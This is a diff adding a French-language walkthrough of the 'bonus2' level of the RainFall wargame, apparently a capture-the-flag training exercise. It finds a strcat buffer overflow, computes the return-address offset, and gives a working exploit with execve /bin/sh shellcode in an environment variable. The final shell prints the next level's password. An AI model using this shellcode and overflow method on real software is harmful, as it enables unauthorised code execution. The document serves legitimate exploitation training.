@@ -1,0 +1,81 @@
+bonus2 prend deux arguments
+
+disass main
+
+Un appel a getenv est effectue suivie d'une comparaison avant un jump
+
+   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
+.....
+   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
+
+en utilisant cat je constate que LANG, fi, nl; sont presents. il y a probablement une comparaison entre la LANG de notre env
+
+��������������Ë$Ð���������U��S���p���t�pf����Ћ���u��[]Ð�S��[��[������[�Hello Hyvää päivää Goedemiddag! LANGfinl;8
+
+
+   0x08048564 <+59>:	movl   $0x28,0x8(%esp)
+   0x0804856c <+67>:	mov    %eax,0x4(%esp)
+   0x08048570 <+71>:	lea    0x50(%esp),%eax
+   0x08048574 <+75>:	mov    %eax,(%esp)
+   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
+
+Une copie de 40 chars est faite depuis notre premier argument
+
+   0x08048584 <+91>:	movl   $0x20,0x8(%esp)
+   0x0804858c <+99>:	mov    %eax,0x4(%esp)
+   0x08048590 <+103>:	lea    0x50(%esp),%eax
+   0x08048594 <+107>:	add    $0x28,%eax
+   0x08048597 <+110>:	mov    %eax,(%esp)
+   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
+
+Une copie de 32 chars est faite depuis notre second argument
+
+   0x0804862b <+258>:	call   0x8048484 <greetuser>
+
+disass greetuser
+
+   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
+
+Nous allons essayer d'overflow le call a strcat
+
+Pour cela j'ai besoin
+Je commence par set ma variable LANG=fi
+
+export LANG="fi"
+
+gdb bonus2
+
+run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+Il semble que notre offset ce situe dans le second argument
+
+run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+
+Notre offset est donc de 18
+
+
+On prepare notre exploit:
+
+export LANG=fi
+export SHELLCODE=$(python -c 'print 100*"\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+
+./bonus2 $(python -c 'print 40*"A"') $(python -c 'print 18*"B" + "\xad\xf8\xff\xbf"')
+
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print 40*"A"') $(python -c 'print 18*"B" + "\xad\xf8\xff\xbf"')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
+$ cd ../bonus3 && cat .pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+
